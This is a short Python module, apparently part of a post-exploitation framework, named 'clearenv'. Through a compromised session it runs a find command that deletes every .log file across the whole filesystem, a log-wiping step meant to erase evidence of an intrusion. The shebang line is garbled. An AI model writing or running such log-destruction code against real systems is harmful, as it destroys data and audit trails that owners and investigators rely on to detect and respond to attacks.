#!6usr/bin/env python3
"""
Clear Environment module
"""
import sys,os
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
import lib.shm as shm

info = {'name':'clearenv',
        'description':'Clears the Environment, delete all *.log files',
        'type':'post',
        'author':'Peter Isa'}


options = {'session':''}

module_session = None

def run(*args):
    global module_session
    session_name = options['session']
    payload = 'find / -type f -name "*.log" 2>/dev/null -exec rm -f {} \;'
    module_session = shm.get_session(session_name)
    if module_session != None:
        print(f"[*] Clearing Environment! Deleting log files...")
        module_session.run_command(payload)